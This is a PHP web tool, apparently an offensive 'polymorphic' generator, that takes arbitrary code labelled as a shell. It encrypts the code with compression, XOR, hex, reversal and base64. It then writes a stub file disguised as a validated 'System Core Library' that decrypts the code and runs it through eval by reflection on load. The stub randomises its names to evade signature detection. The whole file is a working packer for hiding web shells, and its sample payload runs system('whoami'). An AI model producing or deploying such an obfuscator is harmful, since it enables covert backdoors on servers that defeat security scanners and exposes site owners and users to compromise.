<?php
/**
 * KCK Generator (Polymorphic)
 * Auto-Randomize Variable/Class/Function Names
 * 0x6ick - 6ickzone
 */
error_reporting(0);
ini_set('memory_limit', '256M'); 

$msg = "";

function randStr($length = 10) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $res = '';
    for ($i = 0; $i < $length; $i++) {
        $res .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $res;
}

if (isset($_POST['generate'])) {
    $raw_code = $_POST['code'];
    $file_name = !empty($_POST['filename']) ? $_POST['filename'] : 'void.php';

    // Sanitize Input
    $raw_code = preg_replace('/^<\?php/', '', $raw_code);
    $raw_code = preg_replace('/\?>$/', '', $raw_code);
    $raw_code = trim($raw_code);

    if (!empty($raw_code)) {
        
        // Encryption Logic
        $key_part = 'JNdtOotLGjdSlFDgVnDDuXBmyQTId'; 
        
        $step1 = gzcompress($raw_code, 9);
        $step2 = "";
        $k_len = strlen($key_part);
        for ($i = 0; $i < strlen($step1); $i++) {
            $step2 .= $step1[$i] ^ $key_part[$i % $k_len];
        }
        $step3 = bin2hex($step2);
        $step4 = strrev($step3);
        $final_payload = base64_encode($step4);

        // Randomize Signatures (Polymorphism)
        $cls_name   = "Core_".randStr(5)."_Mod";
        $func_exec  = randStr(8);
        $func_entry = "init_".randStr(4);
        
        // Key & Integrity functions
        $f_k1 = randStr(6); $f_k2 = randStr(6); $f_k3 = randStr(6);
        $f_i1 = randStr(6); $f_i2 = randStr(6); $f_i3 = randStr(6);

        // Internal Variables
        $v_payload  = randStr(5);
        $v_decoded  = randStr(5);
        $v_key      = randStr(5);
        $v_integ    = randStr(5);
        $v_final    = randStr(5);
        
        // Decoys
        $c_decoy1   = "CONF_".strtoupper(randStr(6));

        // --- STUB GENERATION ---
        $stub = '<?php
/**
 * System Core Library
 * ID: '.uniqid().'
 * Status: Validated
 * Author: 0x6ick - 6ickzone
 */
error_reporting(0);
ini_set("memory_limit", "512M");

define(\''.$c_decoy1.'\', \''.randStr(15).'\');

class '.$cls_name.' {
    
    // Key Storage
    private function '.$f_k1.'() { return \'JNdtOotLGj\'; }
    private function '.$f_k2.'() { return \'dSlFDgVnD\'; }
    private function '.$f_k3.'() { return \'DuXBmyQTId\'; }

    // Integrity Hash
    private function '.$f_i1.'() { return \'rpPjMuDSyooNdnfJxqJS\'; }
    private function '.$f_i2.'() { return \'aWZeByWUgPivEUyaJKLd\'; }
    private function '.$f_i3.'() { return \'UMruuemTGosDnBBnAslX\'; }

    // Executor
    private function '.$func_exec.'($c = \'\') {
        if (empty($c)) return null;
        $c = preg_replace(\'/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/\', \'\', $c);
        try {
            return eval(trim($c));
        } catch (Throwable $e) { return null; }
    }

    public static function '.$func_entry.'() {
        // Encrypted Payload
        $'.$v_payload.' = \'' . $final_payload . '\';
        
        // 1. Decode Chain
        $'.$v_decoded.' = hex2bin(strrev(base64_decode($'.$v_payload.')));
        
        // 2. Reconstruct Key
        $o = new self();
        $'.$v_key.' = $o->'.$f_k1.'() . $o->'.$f_k2.'() . $o->'.$f_k3.'();
        
        // 3. Integrity Check
        $'.$v_integ.' = $o->'.$f_i1.'() . $o->'.$f_i2.'() . $o->'.$f_i3.'();
        if (md5($'.$v_integ.') !== \'9bdbd9958a3da2272fc03d5cd89df03b\') { return; }

        // 4. Decrypt XOR
        $'.$v_final.' = \'\';
        $kl = strlen($'.$v_key.');
        for ($i=0, $len = strlen($'.$v_decoded.'); $i < $len; $i++) {
            $'.$v_final.' .= chr(ord($'.$v_decoded.'[$i]) ^ ord($'.$v_key.'[$i % $kl]));
        }
        
        // 5. Decompress
        $res = @gzuncompress($'.$v_final.');
        if ($res === false) { $res = @gzinflate($'.$v_final.'); }
        
        // 6. Execution via Reflection
        if ($res) {
            $ref = new ReflectionMethod(__CLASS__, \''.$func_exec.'\');
            $ref->setAccessible(true);
            $ref->invoke(new self(), $res);
        }
    }
}

// Auto Init
if (!defined(\'_SYS_LOADED\')) {
    define(\'_SYS_LOADED\', true);
    '.$cls_name.'::'.$func_entry.'();
}
?>';

        if (file_put_contents($file_name, $stub)) {
            $msg = "<div style='color:#00FF00; border:1px solid #00FF00; padding:10px;'>
                    <b>SUCCESS!</b><br>
                    File: <b>$file_name</b> created.<br>
                    <small>Signature: Randomized (Polymorphic)</small>
                    </div>";
        } else {
            $msg = "<div style='color:red'>Failed to write file. Check permissions.</div>";
        }
    } else {
        $msg = "<div style='color:orange'>Code is empty.</div>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>KCK Generator (Polymorphic)</title>
    <style>
        body { background: #0a0a0f; color: #c9d1d9; font-family: monospace; padding: 20px; }
        .box { max-width: 900px; margin: auto; background: #161b22; padding: 20px; border: 1px solid #30363d; border-radius: 8px; }
        textarea { width: 100%; height: 350px; background: #0d1117; color: #E0FF00; border: 1px solid #30363d; padding: 10px; box-sizing: border-box; font-size: 12px; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #0d1117; border: 1px solid #30363d; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #7D00FF; color: white; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; }
        button:hover { background: #9900FF; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="text-align: center; color: #FF00C8;">PHP Generator (Randomized)</h2>
        <?=$msg;?>
        <form method="POST">
            <label>Input PHP Code (Shell/Script):</label>
           <textarea name="code" required placeholder="&lt;?php 
echo 'YamiRoot1337';
echo '<br>';
system('whoami'); 
phpinfo();
?&gt;"></textarea>
            
            <label>Filename:</label>
            <input type="text" name="filename" value="void.php">
            
            <button type="submit" name="generate">BUILD ENCRYPTED FILE</button>
        </form>
    </div>
</body>
</html>
